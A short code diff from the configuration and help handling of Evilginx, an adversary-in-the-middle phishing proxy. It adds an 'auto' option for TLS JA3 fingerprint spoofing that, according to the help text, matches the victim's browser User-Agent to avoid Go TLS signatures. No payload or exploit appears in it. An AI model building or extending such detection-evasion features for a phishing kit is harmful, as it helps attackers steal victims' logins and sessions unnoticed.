@@ -374,7 +374,7 @@ func (t *Terminal) handleConfig(args []string) error {
 				log.Info("ja3 fingerprint spoofing disabled")
 				return nil
 			}
-			valid := []string{"chrome", "firefox", "safari", "edge", "ios", "random"}
+			valid := []string{"auto", "chrome", "firefox", "safari", "edge", "ios", "random"}
 			isValid := false
 			for _, v := range valid {
 				if v == fpName {
@@ -383,7 +383,7 @@ func (t *Terminal) handleConfig(args []string) error {
 				}
 			}
 			if !isValid {
-				return fmt.Errorf("invalid ja3_fingerprint: %s (valid: none, default, chrome, firefox, safari, edge, ios, random)", args[1])
+				return fmt.Errorf("invalid ja3_fingerprint: %s (valid: none, default, auto, chrome, firefox, safari, edge, ios, random)", args[1])
 			}
 			t.cfg.SetJa3Fingerprint(fpName)
 			log.Warning("ja3 fingerprint changed - restart evilginx for this to take effect")
@@ -3330,7 +3330,7 @@ func (t *Terminal) createHelp() {
 			readline.PcItem("cloudflare_worker", readline.PcItem("account_id"), readline.PcItem("api_token"), readline.PcItem("zone_id"), readline.PcItem("subdomain"), readline.PcItem("enabled", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test")),
 			readline.PcItem("http_port"), readline.PcItem("https_port"), readline.PcItem("dns_port"),
 			readline.PcItem("redirectors_dir"),
-			readline.PcItem("ja3_fingerprint", readline.PcItem("none"), readline.PcItem("default"), readline.PcItem("chrome"), readline.PcItem("firefox"), readline.PcItem("safari"), readline.PcItem("edge"), readline.PcItem("ios"), readline.PcItem("random"))))
+			readline.PcItem("ja3_fingerprint", readline.PcItem("none"), readline.PcItem("default"), readline.PcItem("auto"), readline.PcItem("chrome"), readline.PcItem("firefox"), readline.PcItem("safari"), readline.PcItem("edge"), readline.PcItem("ios"), readline.PcItem("random"))))
 	h.AddSubCommand("config", nil, "", "show all configuration variables")
 	h.AddSubCommand("config", []string{"ipv4"}, "ipv4 <ipv4_address>", "set ipv4 external address of the current server")
 	h.AddSubCommand("config", []string{"ipv4", "external"}, "ipv4 external <ipv4_address>", "set ipv4 external address of the current server")
@@ -3357,7 +3357,7 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("config", []string{"https_port"}, "https_port <port>", "set HTTPS proxy port")
 	h.AddSubCommand("config", []string{"dns_port"}, "dns_port <port>", "set DNS server port")
 	h.AddSubCommand("config", []string{"redirectors_dir"}, "redirectors_dir <path>", "set directory where redirector files are stored")
-	h.AddSubCommand("config", []string{"ja3_fingerprint"}, "ja3_fingerprint <none|default|chrome|firefox|safari|edge|ios|random>", "set outbound TLS fingerprint to mimic a real browser and avoid Go JA3 signatures")
+	h.AddSubCommand("config", []string{"ja3_fingerprint"}, "ja3_fingerprint <none|default|auto|chrome|firefox|safari|edge|ios|random>", "set outbound TLS fingerprint to mimic a real browser and avoid Go JA3 signatures (auto matches the victim's User-Agent)")
 
 	h.AddCommand("proxy", "general", "manage proxy configuration", "Configures proxy which will be used to proxy the connection to remote website\n\nQuickstart:\n  enable:         proxy enable\n  set type:       proxy type <http|socks5>\n  set address:    proxy address <addr>\n  set port:       proxy port <port>", LAYER_TOP,
 		readline.PcItem("proxy", readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("type"), readline.PcItem("address"), readline.PcItem("port"), readline.PcItem("username"), readline.PcItem("password")))
